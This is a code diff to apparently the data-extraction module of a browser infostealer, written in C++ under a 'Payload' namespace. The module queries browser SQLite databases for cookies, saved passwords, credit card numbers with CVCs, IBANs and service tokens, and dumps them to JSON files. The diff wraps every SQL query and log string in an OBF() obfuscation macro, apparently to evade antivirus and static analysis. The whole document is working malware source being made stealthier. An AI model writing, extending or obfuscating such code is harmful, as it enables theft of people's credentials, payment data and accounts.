@@ -4,6 +4,7 @@
 #include "data_extractor.hpp"
 #include "handle_duplicator.hpp"
 #include "../crypto/aes_gcm.hpp"
+#include "../core/obfuscate.hpp"
 #include <fstream>
 #include <sstream>
 #include <iomanip>
@@ -16,7 +17,7 @@ namespace Payload {
 
     sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
         sqlite3* db = nullptr;
-        std::string uri = "file:" + dbPath.string() + "?nolock=1";
+        std::string uri = std::string(OBF("file:").c_str()) + dbPath.string() + OBF("?nolock=1").c_str();
         if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK) {
             if (db) sqlite3_close(db);
             return nullptr;
@@ -28,7 +29,8 @@ namespace Payload {
         sqlite3* db = OpenDatabase(dbPath);
         if (db) {
             sqlite3_stmt* stmt = nullptr;
-            if (sqlite3_prepare_v2(db, "SELECT 1", -1, &stmt, nullptr) == SQLITE_OK) {
+            auto _probe = OBF("SELECT 1");
+            if (sqlite3_prepare_v2(db, _probe.c_str(), -1, &stmt, nullptr) == SQLITE_OK) {
                 if (sqlite3_step(stmt) == SQLITE_ROW) {
                     sqlite3_finalize(stmt);
                     return db;
@@ -54,14 +56,14 @@ namespace Payload {
     }
 
     void DataExtractor::CleanupTempFiles() {
-        for (const auto& tempFile : m_tempFiles) {
+        auto tit = m_tempFiles.begin();
+        while (tit != m_tempFiles.end()) {
             try {
-                if (std::filesystem::exists(tempFile)) {
-                    std::filesystem::remove(tempFile);
+                if (std::filesystem::exists(*tit)) {
+                    std::filesystem::remove(*tit);
                 }
-            } catch (...) {
-                // Ignore cleanup failures
-            }
+            } catch (...) {}
+            ++tit;
         }
         m_tempFiles.clear();
 
@@ -127,9 +129,8 @@ namespace Payload {
 
     void DataExtractor::ExtractCookies(sqlite3* db, const std::filesystem::path& outFile) {
         sqlite3_stmt* stmt;
-        const char* query = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies";
-        
-        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
+        auto _qc = OBF("SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies");
+        if (sqlite3_prepare_v2(db, _qc.c_str(), -1, &stmt, nullptr) != SQLITE_OK) return;
 
         std::vector<std::string> entries;
         int total = 0;
@@ -169,20 +170,20 @@ namespace Payload {
             std::filesystem::create_directories(outFile.parent_path());
             std::ofstream out(outFile);
             out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) {
+            size_t i = 0;
+            while (i < entries.size()) {
                 out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                ++i;
             }
             out << "]";
-            // Structured message: COOKIES:extracted:total
-            m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
+            m_pipe.Log(std::string(OBF("COOKIES:").c_str()) + std::to_string(entries.size()) + ":" + std::to_string(total));
         }
     }
 
     void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
         sqlite3_stmt* stmt;
-        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
-        
-        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
+        auto _qp = OBF("SELECT origin_url, username_value, password_value FROM logins");
+        if (sqlite3_prepare_v2(db, _qp.c_str(), -1, &stmt, nullptr) != SQLITE_OK) return;
 
         std::vector<std::string> entries;
         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -209,19 +210,21 @@ namespace Payload {
             std::filesystem::create_directories(outFile.parent_path());
             std::ofstream out(outFile);
             out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) {
+            size_t i = 0;
+            while (i < entries.size()) {
                 out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+                ++i;
             }
             out << "]";
-            m_pipe.Log("PASSWORDS:" + std::to_string(entries.size()));
+            m_pipe.Log(std::string(OBF("PASSWORDS:").c_str()) + std::to_string(entries.size()));
         }
     }
 
     void DataExtractor::ExtractCards(sqlite3* db, const std::filesystem::path& outFile) {
-        // 1. Load CVCs
         std::map<std::string, std::string> cvcMap;
         sqlite3_stmt* stmt;
-        if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &stmt, nullptr) == SQLITE_OK) {
+        auto _qcvc = OBF("SELECT guid, value_encrypted FROM local_stored_cvc");
+        if (sqlite3_prepare_v2(db, _qcvc.c_str(), -1, &stmt, nullptr) == SQLITE_OK) {
             while (sqlite3_step(stmt) == SQLITE_ROW) {
                 const char* guid = (const char*)sqlite3_column_text(stmt, 0);
                 const void* blob = sqlite3_column_blob(stmt, 1);
@@ -235,8 +238,8 @@ namespace Payload {
             sqlite3_finalize(stmt);
         }
 
-        // 2. Extract Cards
-        if (sqlite3_prepare_v2(db, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, nullptr) != SQLITE_OK) return;
+        auto _qcard = OBF("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards");
+        if (sqlite3_prepare_v2(db, _qcard.c_str(), -1, &stmt, nullptr) != SQLITE_OK) return;
 
         std::vector<std::string> entries;
         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -267,15 +270,17 @@ namespace Payload {
             std::filesystem::create_directories(outFile.parent_path());
             std::ofstream out(outFile);
             out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            size_t i = 0;
+            while (i < entries.size()) { out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n"); ++i; }
             out << "]";
-            m_pipe.Log("CARDS:" + std::to_string(entries.size()));
+            m_pipe.Log(std::string(OBF("CARDS:").c_str()) + std::to_string(entries.size()));
         }
     }
 
     void DataExtractor::ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile) {
         sqlite3_stmt* stmt;
-        if (sqlite3_prepare_v2(db, "SELECT value_encrypted, nickname FROM local_ibans", -1, &stmt, nullptr) != SQLITE_OK) return;
+        auto _qiban = OBF("SELECT value_encrypted, nickname FROM local_ibans");
+        if (sqlite3_prepare_v2(db, _qiban.c_str(), -1, &stmt, nullptr) != SQLITE_OK) return;
 
         std::vector<std::string> entries;
         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -300,19 +305,22 @@ namespace Payload {
             std::filesystem::create_directories(outFile.parent_path());
             std::ofstream out(outFile);
             out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            size_t i = 0;
+            while (i < entries.size()) { out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n"); ++i; }
             out << "]";
-            m_pipe.Log("IBANS:" + std::to_string(entries.size()));
+            m_pipe.Log(std::string(OBF("IBANS:").c_str()) + std::to_string(entries.size()));
         }
     }
 
     void DataExtractor::ExtractTokens(sqlite3* db, const std::filesystem::path& outFile) {
         sqlite3_stmt* stmt;
         bool hasBindingKey = true;
-        
-        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token, binding_key FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) {
+
+        auto _qtok3 = OBF("SELECT service, encrypted_token, binding_key FROM token_service");
+        if (sqlite3_prepare_v2(db, _qtok3.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
             hasBindingKey = false;
-            if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) return;
+            auto _qtok2 = OBF("SELECT service, encrypted_token FROM token_service");
+            if (sqlite3_prepare_v2(db, _qtok2.c_str(), -1, &stmt, nullptr) != SQLITE_OK) return;
         }
 
         std::vector<std::string> entries;
@@ -353,9 +361,10 @@ namespace Payload {
             std::filesystem::create_directories(outFile.parent_path());
             std::ofstream out(outFile);
             out << "[\n";
-            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            size_t i = 0;
+            while (i < entries.size()) { out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n"); ++i; }
             out << "]";
-            m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
+            m_pipe.Log(std::string(OBF("TOKENS:").c_str()) + std::to_string(entries.size()));
         }
     }
 
